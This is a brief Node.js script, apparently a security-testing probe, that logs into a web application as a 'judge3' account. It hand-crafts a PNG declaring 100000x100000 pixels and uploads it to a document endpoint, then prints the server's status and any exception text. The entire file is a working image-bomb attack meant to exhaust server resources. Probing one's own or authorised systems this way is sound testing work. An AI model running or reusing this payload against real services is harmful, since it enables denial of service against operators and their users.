import zlib from 'node:zlib';import crypto from 'node:crypto';import {Client,PW} from './lib.mjs';
const c=new Client();await c.login('judge3',PW.JUDGE3_PASSWORD);
function crc32(buf){let c,crc=0xffffffff;for(let n=0;n<buf.length;n++){c=(crc^buf[n])&0xff;for(let k=0;k<8;k++)c=c&1?0xedb88320^(c>>>1):c>>>1;crc=(crc>>>8)^c;}return (crc^0xffffffff)>>>0;}
function chunk(t,d){const l=Buffer.alloc(4);l.writeUInt32BE(d.length);const td=Buffer.concat([Buffer.from(t),d]);const cr=Buffer.alloc(4);cr.writeUInt32BE(crc32(td));return Buffer.concat([l,td,cr]);}
function png(w,h){const ih=Buffer.alloc(13);ih.writeUInt32BE(w,0);ih.writeUInt32BE(h,4);ih[8]=8;ih[9]=0;return Buffer.concat([Buffer.from([137,80,78,71,13,10,26,10]),chunk('IHDR',ih),chunk('IDAT',zlib.deflateSync(Buffer.alloc(10))),chunk('IEND',Buffer.alloc(0))]);}
async function up(buf,name){const fd=new FormData();fd.append('document',new Blob([buf]),name);const r=await c.req('POST','/api/documents',fd);return [r.status,typeof r.body==='string'?(r.body.match(/<title>[^<]*/)||[''])[0]+' '+(r.body.match(/exception_value">[^<]*/)||[''])[0]:(r.body.error||r.body.id)];}
console.log('bomb 100000x100000',await up(png(100000,100000),'j3r4-bomb.png'));


